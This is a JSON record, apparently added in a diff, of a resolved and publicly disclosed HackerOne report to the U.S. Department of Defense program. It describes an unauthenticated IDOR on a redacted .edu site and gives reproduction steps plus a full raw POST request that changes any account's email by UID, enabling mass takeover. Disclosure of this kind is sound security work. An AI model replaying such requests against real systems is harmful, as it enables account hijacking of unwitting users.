@@ -1,0 +1,118 @@
+{
+  "id": 685338,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82ODUzMzg=",
+  "url": "https://hackerone.com/reports/685338",
+  "title": "Unauth IDOR to mass account takeover without user interaction on the ███████ (https://███████.edu/)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-08-31T01:28:06.298Z",
+  "submitted_at": "2019-08-31T01:28:06.298Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sp1d3rs",
+    "url": "/sp1d3rs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-07-19T14:29:39.972Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-06-18T19:56:46.976Z",
+  "team_member_agreed_on_going_public_at": "2024-07-19T14:29:39.729Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "##Description\nDuring poking around █████/24 range - AS257 ██████ looking for the Cisco devices, I came across virtual host https://██████████.edu/ on the ██████████\nWhile it's a not .mil host, it's likely related to the DoD since it hosted in the DoD-controlled ASN.\n\nI discovered IDOR possibility to mass accounts takeover just by altering a numeric ID.\nResource seems to have ~320 000 accounts (the users ID is incremental and started for me from 320573), and all of them can be taken over with simple automation.\n\n##POC\n1) You need to register some test accounts using:\n████\nMake sure your password are not too long (resource can strip it). Something like 6-7 chars should be ok.\n2) When registering, monitor the requests. Once you press the final \"Register\" button, the request to the \nhttps://██████.edu/chkUser.aspx endpoint wil be issued.\nWrite down the numeric `UID` parameter in the response.\n████████\n3) Login with your account to check it works.\n4) Logout .\n5) Issue next unauth POST request (replace `UID` parameter by your numeric UID you noted earlier):\n```\nPOST /chkUser.aspx HTTP/1.1\nHost: ██████.edu\nConnection: keep-alive\nAccept: */*\nOrigin: https://██████████.edu\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nReferer: https://████.edu/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7\nContent-Length: 281\nContent-Type: application/x-www-form-urlencoded\n\ndummy=&sendingForm=6&UID=[YOUR_ID_HERE]&last=test&midd=&frst=test&serv=test&mail=dummyemail@dummy.tld&tLang=&course=1&school=Other+non-Government&other&freq=Rarely&test=1&reading_score=&listening_score=aaa&speaking_score=aaa&test_taken=Other&other_test=test&when=more+than+a+year+ago\n```\n6) Your email will be changed to the `dummyemail@dummy.tld`\nYou can login with this email and your password to check it works. You will be unable to login with old email.\nAttacker may use it flaw to point account to his email and then initiate password reset.\n\nNote, that endpoint is also vulnerable to the CSRF in same time, since there is no any CSRF protection (it worth to fix tho), but I'm reporting here IDOR since it poses much more risks.\n\n##Notes\nIn terms of transparency I should notify that during testing, I accidentally could affect single account with ID `320572` (my accounts were `320573`, `320574` and `320575`).\nI never expected that unauth request will actually work, and instead incrementing my ID I accidentally decremented it and likely changed someone's email to the `test@test.test`. This user will likely be unable to login, so it worth to identify him and giving this email (or restore original) so he/she will be able to login (password was unchanged, and I didn't access account itself). I have no evidence does this account active, inactive or ever exist, just notify that it **could** be affected.\n\n##Suggested fix\nCheck that UID belongs to the current user session, or better drop this parameter at all, and allow to change the user data based on the current authenticated session.\n\n## Impact\n\nTakeover any user account without interaction by changing the email via numeric ID. Attacker can after initiate password reset and authorize on behalf of the victim.\nThe endpoint is also vulnerable to the CSRF.",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 17,
+  "voters": [
+    "zy9ard3",
+    "mohaned0101",
+    "pwnx",
+    "shubham_srt",
+    "iwasday",
+    "pr0f0x01",
+    "mr-inspector",
+    "imadsaad",
+    "oleh_durasov",
+    "inzamulsepoy",
+    "and 7 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
